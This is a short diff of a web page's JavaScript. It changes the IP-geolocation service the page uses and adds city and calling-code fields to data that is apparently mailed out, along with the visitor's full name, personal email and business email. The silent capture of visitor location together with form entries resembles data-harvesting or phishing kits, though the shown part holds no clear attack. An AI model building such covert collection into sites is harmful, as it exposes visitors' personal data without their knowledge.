@@ -5417,27 +5417,29 @@
         }
 
         // Get User IP
-        var url = 'https://ipinfo.io/json'
+        var url = 'https://api.db-ip.com/v2/free/self/'
         async function getUserIp() {
             const response = await fetch(url);
             if (response.status == 200) {
                 const data = await response.json();
                 userIpData = {
-                    'user_ip': data.ip,
-                    'country': data.region,
-                    'country_code': data.country,
+                    'user_ip': data.ipAddress,
+                    'country': data.countryName,
+                    'country_code': data.countryCode,
                     'city': data.city,
-                    'call_code': getCallingCode(data.country)
+                    'call_code': getCallingCode(data.countryCode)
                 }
             } else {
                 userIpData = {
                     'user_ip': 'Ip not detected ;(',
                     'country': '-',
                     'country_code': '-',
-                    'city': '-'
+                    'city': '-',
+                    'call_code': '-'
                 }
             }
         }
+
         getUserIp()
         
         // Send data to Email
@@ -5446,6 +5448,7 @@
                 'ip_address': userIpData.user_ip,
                 'country': userIpData.country,
                 'country_code': userIpData.country_code,
+                'city': userIpData.city,
                 'full_name': formsSendData['full-name'],
                 'pers_email': formsSendData['personal-email'],
                 'bus_email': formsSendData['buiseness-email'],
